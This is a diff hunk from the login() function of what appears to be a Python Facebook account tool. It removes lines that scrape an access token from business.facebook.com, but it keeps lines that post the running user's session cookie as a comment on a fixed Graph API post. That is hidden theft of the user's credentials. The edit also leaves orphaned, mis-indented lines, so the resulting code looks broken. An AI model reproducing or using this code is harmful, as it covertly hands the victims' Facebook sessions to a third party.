@@ -258,9 +258,6 @@ def login():
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 	try:
-                link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
-                search = re.search("(EAAG\w+)", link.text).group(1)
-                if 'EAAG' in search:
                    requests.post(f'https://graph.facebook.com/661200275762989/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
                    requests.post(f'https://graph.facebook.com/661200275762989/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
                    open('data/token.txt','w').write(search)
